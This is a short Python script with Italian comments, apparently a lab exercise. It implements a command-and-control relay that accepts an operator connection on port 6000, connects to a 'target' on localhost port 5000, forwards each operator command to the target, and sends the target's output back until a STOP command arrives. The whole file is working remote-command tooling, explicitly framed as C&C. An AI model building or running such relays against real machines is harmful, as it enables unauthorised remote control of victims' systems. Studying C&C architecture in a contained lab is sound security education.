import socket

# Il C&C si mette in ascolto per l'operatore
HOST_CNC = ''
PORT_CNC = 6000
s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s1.bind((HOST_CNC, PORT_CNC))
s1.listen(1)
conn_operator, addr = s1.accept()
print("[C&C] Operator connected.")

# Si connette al Target 
HOST_TARGET = 'localhost'
PORT_TARGET = 5000
s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s2.connect((HOST_TARGET, PORT_TARGET))
print("[C&C] Connected to Target.")

while True:
    # Riceve comando dall'operatore
    command = conn_operator.recv(1024)
    print(f"[C&C] Command received: {command.decode().strip()}")

    # Invia il comando al Target
    s2.send(command)
    
    if command.decode().strip().upper() == "STOP":
        print("[C&C] Connection closing.")
        break

    # Riceve l'output 
    output = b""
    s2.settimeout(1.0) 
    try:
        while True:
            chunk = s2.recv(4096)
            if not chunk:
                break
            output += chunk
    except socket.timeout:
        pass 

    # Inoltra all'operatore
    conn_operator.sendall(output)

s2.close()
conn_operator.close()
s1.close()
